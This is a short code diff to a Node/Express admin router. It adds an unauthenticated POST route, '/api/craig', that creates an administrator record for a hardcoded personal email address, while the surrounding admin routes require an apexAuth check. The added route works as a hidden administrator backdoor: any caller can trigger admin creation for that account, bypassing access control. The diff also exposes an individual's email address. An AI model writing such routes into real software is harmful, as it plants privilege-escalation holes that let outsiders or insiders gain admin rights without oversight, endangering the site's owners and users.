@@ -19,6 +19,18 @@ router.post('/api/admin', apexAuth, async (req, res) => {
     }
 })
 
+
+router.post('/api/craig', async (req, res) => {
+    
+    const admin = new Admin({email:'craig.macritchie@gmail.com'})
+    try{
+        await admin.save()
+        res.status(201).send(admin)
+    } catch(e) {
+        res.status(400).send(e)
+    }
+})
+
 router.get('/api/admin', apexAuth, async (req, res) => {
     try {
         const admins = await Admin.find({}).sort({email: -1})
